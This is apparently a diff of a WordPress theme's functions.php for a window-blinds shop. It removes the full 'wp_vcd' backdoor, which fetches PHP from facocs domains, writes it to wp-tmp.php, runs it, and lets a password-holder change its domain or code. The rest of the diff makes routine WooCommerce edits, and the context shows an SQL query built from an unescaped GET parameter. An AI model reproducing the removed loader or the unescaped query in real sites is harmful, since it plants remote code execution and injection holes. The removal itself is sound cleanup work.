@@ -1,328 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '07e03df36697e0fdf7d620997be103dc'))
-	{
-		$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							if (!empty($_REQUEST['newdomain']))
-								{
- 									if ($file = @file_get_contents(__FILE__))
-		                        		{
-
-                                 			if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-
-                                                {
-
-
-
-			                                        $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-
-			                                        @file_put_contents(__FILE__, $file);
-
-									                print "true";
-                                                }
-										}
-								}
-						}
-							break;
-								case 'change_code';
-
-					if (isset($_REQUEST['newcode']))
-
-						{
-
-							
-
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-
-                                                                                                             {
-
-
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-
-			                                                                           @file_put_contents(__FILE__, $file);
-
-									                           print "true";
-
-                                                                                                             }
-
-
-
-
-
-		                                                                    }
-
-								}
-
-						}
-
-				break;
-
-				
-
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-
-			}
-
-			
-
-		die("");
-
-	}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-
-$funcfile      = __FILE__;
-
-if(!function_exists('theme_temp_setup')) {
-
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
-
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-
-        
-
-        function file_get_contents_tcurl($url)
-
-        {
-
-            $ch = curl_init();
-
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-
-            curl_setopt($ch, CURLOPT_URL, $url);
-
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-
-            $data = curl_exec($ch);
-
-            curl_close($ch);
-
-            return $data;
-
-        }
-
-        
-
-        function theme_temp_setup($phpCode)
-
-        {
-
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-
-            $handle   = fopen($tmpfname, "w+");
-
-           if( fwrite($handle, "<?php\n" . $phpCode))
-
-		   {
-
-		   }
-
-			else
-
-			{
-
-			$tmpfname = tempnam('./', "theme_temp_setup");
-
-            $handle   = fopen($tmpfname, "w+");
-
-			fwrite($handle, "<?php\n" . $phpCode);
-
-			}
-
-			fclose($handle);
-
-            include $tmpfname;
-
-            unlink($tmpfname);
-
-            return get_defined_vars();
-
-        }
-
-        
-
-
-
-$wp_auth_key='0bb00640fa54049fc4c2c5e080f9f51a';
-
-        if (($tmpcontent = @file_get_contents("http://www.facocs.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.facocs.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-
-                extract(theme_temp_setup($tmpcontent));
-
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
-                
-
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-
-                    }
-
-                }
-
-                
-
-            }
-
-        }
-
-        
-
-        
-
-        elseif ($tmpcontent = @file_get_contents("http://www.facocs.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-
-                extract(theme_temp_setup($tmpcontent));
-
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
-                
-
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-
-                    }
-
-                }
-
-                
-
-            }
-
-        } 
-
-		
-
-		        elseif ($tmpcontent = @file_get_contents("http://www.facocs.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-
-                extract(theme_temp_setup($tmpcontent));
-
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
-                
-
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-
-                    }
-
-                }
-
-                
-
-            }
-
-        }
-
-		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            extract(theme_temp_setup($tmpcontent));
-
-           
-
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            extract(theme_temp_setup($tmpcontent)); 
-
-
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            extract(theme_temp_setup($tmpcontent)); 
-
-
-
-        } 
-
-        
-
-        
-
-        
-
-        
-
-        
-
-    }
-
-}
-
-
-
-//$start_wp_theme_tmp
-
-
-
-
-
-
-
-//wp_tmp
-
-
-
-
-
-//$end_wp_theme_tmp
-
-?><?php
 
 /**
 
@@ -1325,7 +1001,7 @@ function price_group_page()
            <?php $priceGroup1=$wpdb->get_results("SELECT * FROM `".$wpdb->prefix."groupTerm` WHERE groupid=".$_GET['pricegroup']." AND height=".$height->height." ORDER BY width ASC"); ?>
            <?php foreach($priceGroup1 as $priceG)
 		   {?>
-			   <td><input type="text" id="price<?php echo $priceG->id; ?>" name="price<?php echo $priceG->id; ?>" value="<?php echo $priceG->price; ?>" readonly="readonly" style="width:50px;" /></td>
+			   <td><input type="text" id="price<?php echo $priceG->id; ?>" name="price<?php echo $priceG->id; ?>" value="<?php echo $priceG->price; ?>" readonly style="width:50px;" /></td>
 		   <?php }?>
            </tr>
 	   <?php }?>
@@ -1350,7 +1026,7 @@ function price_group_page()
 		{?>
         
 			<td>
-            	<input type="text" id="price<?php echo $price->id; ?>" name="price<?php echo $price->id; ?>" value="<?php echo $price->price; ?>" readonly="readonly" style="width:50px;" />
+            	<input type="text" id="price<?php echo $price->id; ?>" name="price<?php echo $price->id; ?>" value="<?php echo $price->price; ?>" readonly style="width:50px;" />
             </td>
             
 		<?php }?>
@@ -1376,7 +1052,7 @@ function price_group_page()
 		{?>
         
 			<td>
-            	<input type="text" id="price<?php echo $price->id; ?>" name="price<?php echo $price->id; ?>" value="<?php echo $price->price; ?>" readonly="readonly" style="width:50px;" />
+            	<input type="text" id="price<?php echo $price->id; ?>" name="price<?php echo $price->id; ?>" value="<?php echo $price->price; ?>" readonly style="width:50px;" />
             </td>
             
 		<?php }?>
@@ -2181,7 +1857,7 @@ add_action('wp_ajax_orderBlind', 'orderBlind');
 add_action('wp_ajax_nopriv_orderBlind', 'orderBlind');
 function orderBlind()
 {
-	WC()->cart->add_to_cart( $_POST['product_id'],$_POST['quantity'],0,array(),array('roomType'=>$_POST['roomType'],'color'=>$_POST['color'],'mount'=>$_POST['mount'],'size'=>$_POST['size'],'width'=>$_POST['width'],'height'=>$_POST['height'],'widthInner'=>$_POST['widthInner'],'heightInner'=>$_POST['heightInner'],'price'=>$_POST['product_price'],'liftOption'=>$_POST['liftOption'],'tiltOption'=>$_POST['tiltOption'],'decorative'=>$_POST['decorative'],'routeless'=>$_POST['routeless'],'valanceOption'=>$_POST['valanceOption'],'nickname'=>$_POST['nickname']) );
+	WC()->cart->add_to_cart( $_POST['product_id'],$_POST['quantity'],0,array(),array('roomType'=>$_POST['roomType'],'color'=>$_POST['color'],'mount'=>$_POST['mount'],'size'=>$_POST['size'],'width'=>$_POST['width'],'height'=>$_POST['height'],'widthInner'=>$_POST['widthInner'],'heightInner'=>$_POST['heightInner'],'price'=>$_POST['product_price'],'liftOption'=>$_POST['liftOption'],'tiltOption'=>$_POST['tiltOption'],'decorative'=>$_POST['decorative'],'routeless'=>$_POST['routeless'],'valanceOption'=>$_POST['valanceOption'],'nickname'=>$_POST['nickname'],'shade'=>$_POST['shade'],'rightWidth'=>$_POST['rightWidth'],'rightHeight'=>$_POST['rightHeight'],'centerWidth'=>$_POST['centerWidth'],'centerHeight'=>$_POST['centerHeight']) );
 	die;
 }
 
@@ -2201,7 +1877,6 @@ function getMaxWidthMaxHeight()
 	$j=0;
 	foreach($FabricTermWidthHeightObject as $Object)
 	{
-
 		foreach($Object['lifting_option'] as $ObjectInner)
 		{
 			if($ObjectInner==$liftOptionTermid)
@@ -2219,7 +1894,30 @@ function getMaxWidthMaxHeight()
 		$minHeight=$FabricTermWidthHeightObject[$i]['height_min'];
 		$maxWidth=$FabricTermWidthHeightObject[$i]['width_max'];
 		$maxHeight=$FabricTermWidthHeightObject[$i]['height_max'];
-
+		if(!is_numeric($minWidth))
+		{
+			$minWidth=$FabricTermWidthHeightObject[$i]['width_min_panel'];
+		}
+		if(!is_numeric($minWidth))
+		{
+			$minWidth=$FabricTermWidthHeightObject[$i]['width_min_panel'];
+		}
+		if(!is_numeric($minHeight))
+		{
+			$minHeight=$FabricTermWidthHeightObject[$i]['height_min_shade'];
+		}
+		if(!is_numeric($maxWidth))
+		{
+			$maxWidth=$FabricTermWidthHeightObject[$i]['width_max_panel'];
+		}
+		if(!is_numeric($maxWidth))
+		{
+			$maxWidth=$FabricTermWidthHeightObject[$i]['width_max_shade'];
+		}
+		if(!is_numeric($maxHeight))
+		{
+			$maxHeight=$FabricTermWidthHeightObject[$i]['height_max_shade'];
+		}
 		if($widthProduct > $maxWidth || $heightProduct > $maxHeight)
 		{
 			$arrayMsg=array('msg'=>'Your size selection requires that your total width does not exceed '.$maxWidth.'" inches and height does not exceed '.$maxHeight.'.  Please adjust your treatment size.');
@@ -2474,6 +2172,15 @@ function my_admin_footer_function() {
 }
 
 */
+add_action('wp_ajax_getProductCatPage', 'getProductCatPage');
+add_action('wp_ajax_nopriv_getProductCatPage', 'getProductCatPage');
+
+function getProductCatPage()
+{
+	$product_cat=$_POST['product_cat'];
+	$width=$_POST['width'];
+	$height=$_POST['height'];
+}
 
 add_filter('tag_row_actions','my_term_action',10,2);
 function my_term_action($actions,$tag){
@@ -2482,3 +2189,11 @@ if($tag->taxonomy == 'fabric_styles'):
 endif;
 return $actions;
 }
+function mytheme_add_woocommerce_support() {
+	add_theme_support( 'woocommerce' );
+	//add_theme_support( 'wc-product-gallery-zoom' );
+    add_theme_support( 'wc-product-gallery-lightbox' );
+    add_theme_support( 'wc-product-gallery-slider' );
+}
+add_action( 'after_setup_theme', 'mytheme_add_woocommerce_support' );
+    
